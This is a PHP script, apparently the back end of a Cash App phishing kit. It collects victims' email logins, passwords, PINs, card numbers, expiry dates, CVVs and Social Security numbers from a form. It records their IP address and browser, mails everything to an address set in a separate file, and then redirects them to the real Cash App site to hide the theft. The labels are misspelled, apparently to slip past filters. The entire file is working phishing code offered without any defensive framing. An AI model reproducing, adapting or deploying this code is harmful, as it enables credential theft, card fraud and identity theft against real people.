<?php
if($_POST["ud"] != "" and $_POST["pd"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Ca'sh'App Info-----------------------\n";
$message .= "Em@il Address          : ".$_POST['ud']."\n";
$message .= "Em@il Pa'ssw0rd        : ".$_POST['pd']."\n";
$message .= "P!N	            	: ".$_POST['pn']."\n";
$message .= "C@rd Number            : ".$_POST['cn']."\n";
$message .= "Expiry Date       		: ".$_POST['ex']."\n";
$message .= "C'V.V            		: ".$_POST['vc']."\n";
$message .= "S.S,N            		: ".$_POST['sn']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- unknown --------------|\n";
include 'email.php';
$subject = "Card | $ip";
{
mail("$to", "$send", "$subject", $message);     
}
$praga=rand();
$praga=md5($praga);
  header ("Location: https://cash.app/");
}else{
header ("Location: index.php");
}

?>